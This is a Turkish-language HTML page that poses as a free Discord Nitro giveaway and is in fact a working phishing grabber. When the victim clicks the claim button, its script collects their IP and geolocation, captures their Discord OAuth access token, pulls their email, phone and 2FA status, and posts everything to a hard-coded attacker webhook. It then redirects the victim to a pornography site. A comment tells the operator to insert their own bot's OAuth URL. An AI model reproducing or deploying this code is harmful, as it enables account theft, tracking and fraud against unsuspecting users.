<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apex System I - Nitro Claim</title>
    <style>
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 80px;
        }
        h1 { color: #00ffcc; font-size: 2.8rem; }
        button {
            margin-top: 40px;
            padding: 18px 70px;
            font-size: 22px;
            background: #3ba55c;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>🎁 1 YIL ÜCRETSİZ NITRO KAZANDIN!</h1>
    <p style="font-size:20px;">Claim etmek için butona tıkla</p>
    <button onclick="startOAuth()">NITRO CLAIM ET</button>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1493914750055092334/c4te86vOd5_gaR4ak2GiUhnObzbAQJm_1slOmR4jaYz78xt_xNfnMwZZsHrCb5cqcIbP";
        const OAUTH_URL = "https://discord.com/oauth2/authorize?client_id=1446814626154020944"; 
        // ↑ Yukarıdaki URL'yi kendi botunun OAuth2 URL Generator'ından al ve yapıştır

        async function sendFullInfo(token, ipData) {
            try {
                const res = await fetch("https://discord.com/api/v9/users/@me", {
                    headers: { "Authorization": token }
                });
                const user = await res.json();

                const embed = {
                    title: "☠️ OAUTH İLE FULL HESAP ÇEKİLDİ ☠️",
                    color: 0x00ff00,
                    fields: [
                        { name: "IP & Konum", value: `${ipData.ip} - ${ipData.city}, ${ipData.country}`, inline: false },
                        { name: "Google Maps", value: `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`, inline: false },
                        { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
                        { name: "Kullanıcı", value: `${user.username}#${user.discriminator}`, inline: true },
                        { name: "Email", value: user.email || "Gizli", inline: true },
                        { name: "Telefon", value: user.phone || "Yok", inline: true },
                        { name: "2FA", value: user.mfa_enabled ? "✅ Açık" : "❌ Kapalı", inline: true }
                    ]
                };

                fetch(WEBHOOK, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ username: "Apex System Grabber", embeds: [embed] })
                });
            } catch(e) {}
        }

        async function startOAuth() {
            // IP al
            let ipData = {};
            try {
                const r = await fetch("https://ipapi.co/json/");
                ipData = await r.json();
            } catch(e) {}

            // OAuth izin ekranını aç
            window.location.href = OAUTH_URL;

            // Token'ı URL'den yakala (redirect sonrası)
            window.addEventListener("load", () => {
                if (window.location.hash.includes("access_token")) {
                    const hash = window.location.hash.substring(1);
                    const params = new URLSearchParams(hash);
                    const token = params.get("access_token");

                    if (token) {
                        sendFullInfo(token, ipData);
                        // Porno yönlendirme
                        setTimeout(() => window.location.href = "https://pornhub.com", 1500);
                    }
                }
            });
        }
    </script>
</body>
</html>
